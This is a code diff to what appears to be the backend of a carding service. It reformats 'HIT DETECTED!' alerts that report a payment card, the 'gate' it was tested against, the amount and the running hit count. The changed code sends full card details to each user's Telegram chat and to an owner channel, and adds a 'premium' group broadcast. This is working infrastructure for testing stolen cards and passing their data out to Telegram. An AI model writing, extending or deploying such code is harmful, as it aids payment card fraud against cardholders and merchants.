@@ -249,25 +249,49 @@ export default {
         const hitRow = await env.DB.prepare("SELECT COUNT(*) as c FROM hits WHERE telegram_id=?").bind(s.sub).first();
         const totalHits = hitRow?.c || 1;
 
-        // Format notification
-        const uname = user?.username ? `@${user.username}` : `ID:${s.sub}`;
-        const name = [user?.first_name, user?.last_name].filter(Boolean).join(" ") || uname;
-        const ts = time || new Date(now * 1000).toUTCString();
+        // Format names / identifiers
+        const uname   = user?.username ? `@${user.username}` : null;
+        const name    = [user?.first_name, user?.last_name].filter(Boolean).join(" ") || uname || `ID: ${s.sub}`;
+        const ts      = new Date(now * 1000).toLocaleString("en-GB", { timeZone: "UTC",
+          day: "2-digit", month: "short", year: "numeric",
+          hour: "2-digit", minute: "2-digit", second: "2-digit" }) + " UTC";
 
-        const notification = `🎯 *HIT DETECTED!*\n\n` +
-          `👤 *User:* ${name} (${uname})\n` +
+        // ── Full notification → user's personal chat + owner channel ──────
+        const fullMsg =
+          `🎯 *HIT DETECTED!*\n` +
+          `━━━━━━━━━━━━━━━━━━\n` +
+          `👤 *Name:* ${name}\n` +
+          (uname ? `🆔 *Username:* ${uname}\n` : `🆔 *ID:* ${s.sub}\n`) +
           `💳 *Card:* \`${cardDisplay}\`\n` +
           `🏪 *Gate:* ${gate || "Unknown"}\n` +
           (amount ? `💰 *Amount:* ${amount}\n` : "") +
+          `📊 *Total hits:* ${totalHits}\n` +
           `⏰ *Time:* ${ts}\n` +
-          `📊 *Total hits:* ${totalHits}`;
+          `━━━━━━━━━━━━━━━━━━`;
 
-        // Notify user personal chat
-        await sendTelegramMessage(env, s.sub, notification);
+        // ── Premium group message → name/ID + amount + attempts + time only
+        const premiumGroupMsg =
+          `┌─────────────────────\n` +
+          `│  ⚡️ *DAEMON  •  HIT*\n` +
+          `├─────────────────────\n` +
+          `│ 👤  *${name}*\n` +
+          (uname ? `│ 🆔  ${uname}\n` : `│ 🆔  \`${s.sub}\`\n`) +
+          `│ 💰  *${amount || "N/A"}*\n` +
+          `│ 🎯  Attempt *#${totalHits}*\n` +
+          `│ ⏰  ${ts}\n` +
+          `└─────────────────────`;
 
-        // Notify owner channel
+        // Notify user's personal chat (full details)
+        await sendTelegramMessage(env, s.sub, fullMsg);
+
+        // Notify owner channel (full details)
         if (env.TELEGRAM_CHANNEL_ID) {
-          await sendTelegramMessage(env, env.TELEGRAM_CHANNEL_ID, notification);
+          await sendTelegramMessage(env, env.TELEGRAM_CHANNEL_ID, fullMsg);
+        }
+
+        // Notify group chat (premium clean format — no card/gate data)
+        if (env.TELEGRAM_GROUP_ID) {
+          await sendTelegramMessage(env, env.TELEGRAM_GROUP_ID, premiumGroupMsg);
         }
 
         return json({ ok: true, total: totalHits }, { headers: cors });
